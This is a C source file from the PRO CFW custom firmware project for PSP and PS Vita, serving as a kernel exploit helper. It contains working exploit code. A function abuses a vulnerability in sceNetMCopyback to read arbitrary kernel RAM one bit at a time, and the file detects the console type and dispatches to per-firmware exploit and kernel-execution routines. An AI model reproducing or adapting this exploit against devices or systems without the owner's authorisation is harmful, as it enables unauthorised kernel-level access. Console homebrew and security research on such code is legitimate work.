/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "macros.h"
#include "globals.h"
#include "functions.h"
#include "kxploit.h"

#include "common/utils/scanner.c"

/*
Kernel exploit helper.
*/

enum {
    TYPE_360,
    TYPE_660,
    TYPE_CFW,
};

UserFunctions* g_tbl = NULL;
int kx_type = TYPE_360;
u32 test_val = 0;

static void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);

/* Actual code to trigger the kram read vulnerability.
    We can read the value stored at any location in Kram.
*/

static int sceNetMCopyback_exploit_helper(uint32_t addr, uint32_t value, uint32_t seed) {
	uint32_t a0[7];
	a0[0] = addr - 12;
	a0[3] = seed + 1; // (int)a0[3] must be < (int)a1
	a0[4] = 0x20000; // a0[4] must be = 0x20000
	a0[6] = seed; // (int)a0[6] must be < (int)a0[3]
	uint32_t a1 = value + seed + 1;
	uint32_t a2 = 0; // a2 must be <= 0
	uint32_t a3 = 1; // a3 must be > 0
	_sceNetMCopyback_1560F143(a0, a1, a2, a3);
	return a0[6] != seed;
}

// input: 4-byte-aligned kernel address to a non-null positive 32-bit integer
// return *addr >= value;
static int is_ge_pos(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0xFFFFFFFF);
}

// input: 4-byte-aligned kernel address to a non-null negative 32-bit integer
// return *addr <= value;
static int is_le_neg(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0x80000000);
}

// input: 4-byte-aligned kernel address to a non-null 32-bit integer
// return (int)*addr > 0
static int is_positive(uint32_t addr) {
	return is_ge_pos(addr, 1);
}
u32 readKram(u32 addr) {
	unsigned int res = 0;
	int bit_idx = 1;
	if (is_positive(addr)) {
		for (; bit_idx < 32; bit_idx++) {
			unsigned int value = res | (1 << (31 - bit_idx));
			if (is_ge_pos(addr, value))
				res = value;
		}
		return res;
	}
	res = 0x80000000;
	for (; bit_idx < 32; bit_idx++) {
		unsigned int value = res | (1 << (31 - bit_idx));
		if (is_le_neg(addr, value))
			res = value;
	}
	if (res == 0xFFFFFFFF)
		res = 0;
	return res;


}

int stubScanner(UserFunctions* tbl){
    int res;
    g_tbl = tbl;

    g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
	_sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);

    if (!_sceNetMCopyback_1560F143) return -1;

    u32 set_start_module_handler = tbl->FindImportUserRam("SystemCtrlForUser", 0x1C90BECB); // weak import in ARK Live
    u16 start_module_syscall = _lh((u32)set_start_module_handler+6);
    if (set_start_module_handler && start_module_syscall && start_module_syscall != 0x2402){
        kx_type = TYPE_CFW;
        PRTSTR("CFW found");
    }
    else {
        test_val = readKram(SYSMEM_OFFSET_CHECK);
        if (test_val == 0x8FBF003C){
            kx_type = TYPE_660;
            PRTSTR("PSP Found");
        }
        else {
            kx_type = TYPE_360;
            PRTSTR("PS Vita found");
        }
    }

    switch (kx_type){
        case TYPE_360: res = stubScanner360(tbl); break;
        case TYPE_660: res = stubScanner660(tbl); break;
        case TYPE_CFW: res = stubScannerCFW(tbl); break;
    };

    return res;
}

void repairInstruction(KernelFunctions* k_tbl){
    switch (kx_type){
        case TYPE_360: repairInstruction360(k_tbl); break;
        case TYPE_660: repairInstruction660(k_tbl); break;
        case TYPE_CFW: repairInstructionCFW(k_tbl); break;
    };
}

int doExploit(void){
    int res;
    switch (kx_type){
        case TYPE_360: res = doExploit360(); break;
        case TYPE_660: res = doExploit660(); break;
        case TYPE_CFW: res = doExploitCFW(); break;
    };
    return res;
}

void executeKernel(u32 kfuncaddr){
    switch (kx_type){
        case TYPE_360: executeKernel360(kfuncaddr); break;
        case TYPE_660: executeKernel660(kfuncaddr); break;
        case TYPE_CFW: executeKernelCFW(kfuncaddr); break;
    };
}